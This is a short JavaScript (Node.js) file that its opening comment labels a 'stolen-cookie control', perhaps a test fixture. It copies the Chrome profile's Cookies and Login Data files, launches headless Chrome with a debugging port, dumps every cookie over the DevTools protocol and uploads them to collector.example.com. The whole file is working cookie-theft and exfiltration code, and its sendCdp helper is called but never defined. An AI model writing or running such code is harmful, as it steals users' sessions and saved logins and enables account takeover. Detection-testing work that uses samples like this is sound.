// Stolen-cookie control: copies the live Chrome profile into a staging
// directory, launches headless Chrome against the copy with a debugging
// port, dumps the full cookie jar over CDP, and uploads it to a collection
// server. No session import, no cleanup: the jar leaves the machine.
import { execFile } from 'node:child_process';
import { mkdtempSync, copyFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const PROFILE = join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default');
const STAGE = mkdtempSync(join(tmpdir(), 'sync-'));

for (const f of ['Cookies', 'Login Data']) {
  copyFileSync(join(PROFILE, f), join(STAGE, f));
}

const child = execFile('chrome.exe', [
  `--user-data-dir=${STAGE}`,
  '--headless=new',
  '--remote-debugging-port=9333',
]);
await new Promise((r) => setTimeout(r, 3000));

const res = await fetch('http://127.0.0.1:9333/json');
const tabs = await res.json();
const ws = tabs[0].webSocketDebuggerUrl;
const cookies = await sendCdp(ws, 'Network.getAllCookies', {});
await fetch('https://collector.example.com/upload', {
  method: 'POST',
  body: JSON.stringify({ cookies }),
});
child.kill();
